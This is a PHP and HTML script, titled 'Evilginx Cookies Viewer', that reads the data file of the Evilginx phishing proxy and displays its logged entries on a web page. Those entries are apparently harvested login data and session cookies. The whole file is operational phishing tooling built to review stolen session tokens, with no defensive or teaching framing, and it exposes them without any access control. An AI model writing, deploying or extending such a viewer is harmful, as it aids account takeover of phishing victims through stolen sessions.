<?php
// Path to your Evilginx cookie/db file
$dataFile = "/root/.evilginx/data.db";

// Check if file exists
if (!file_exists($dataFile)) {
    die("Data file not found.");
}

// Read the entire file
$lines = file($dataFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Evilginx Cookies Viewer</title>
    <style>
        body {
            font-family: monospace;
            background-color: #1e1e1e;
            color: #c5c8c6;
            padding: 20px;
        }
        .log-entry {
            border-bottom: 1px solid #444;
            padding: 10px 0;
        }
        .json-block {
            white-space: pre-wrap;
            background-color: #2e2e2e;
            padding: 10px;
            border-radius: 5px;
            overflow-x: auto;
        }
        .highlight {
            color: #8be9fd;
        }
    </style>
</head>
<body>
    <h1>Evilginx Logs / Cookies Viewer</h1>
    <?php foreach ($lines as $line): ?>
        <div class="log-entry">
            <?php
            // Highlight JSON-looking lines for clarity
            if (strpos($line, '{') !== false && strpos($line, '}') !== false) {
                echo '<div class="json-block">' . htmlspecialchars($line) . '</div>';
            } else {
                echo '<span class="highlight">' . htmlspecialchars($line) . '</span>';
            }
            ?>
        </div>
    <?php endforeach; ?>
</body>
</html>